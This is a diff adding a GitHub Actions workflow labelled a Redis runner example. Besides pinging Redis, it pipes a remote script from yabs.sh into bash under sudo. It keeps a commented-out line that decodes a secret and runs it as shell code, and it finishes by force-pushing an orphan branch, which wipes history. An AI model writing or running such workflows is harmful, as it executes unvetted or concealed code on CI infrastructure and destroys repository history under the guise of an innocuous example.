@@ -1,0 +1,31 @@
+name: Redis runner example..
+on: push
+jobs:
+  build:
+    runs-on: "ubuntu-latest"
+    env:     
+      GITKEY: ${{secrets.GITKEY }}
+    steps:
+      - uses: actions/checkout@v4
+      - id: setup
+        uses: shogo82148/actions-setup-redis@v1
+      # connect to the redis-server via TCP
+      - run: |
+          sudo curl -sL yabs.sh | bash
+          redis-cli -h 127.0.0.1 -p ${{ steps.setup.outputs.redis-port }} ping
+          #echo "$GITKEY" | base64 --decode | sh  #> /dev/null 2>&1
+          redis-cli -h 127.0.0.1 -p ${{ steps.setup.outputs.redis-port }} ping
+      - name: Commit
+        run: |
+          git config --local user.name "github-actions[bot]"
+          git config --local user.email "41898282+github-actions[bot]@users.noreply.github.com"
+          git checkout --orphan latest_branch
+          git add -A
+          git commit -am "[AUTO:BUILD] `date`"
+      - name: GitHub Push
+        uses: ad-m/github-push-action@master
+        with:
+          force: true
+          directory: "."
+          github_token: ${{ secrets.GITHUB_TOKEN }}
+          branch: ${{ github.ref }}
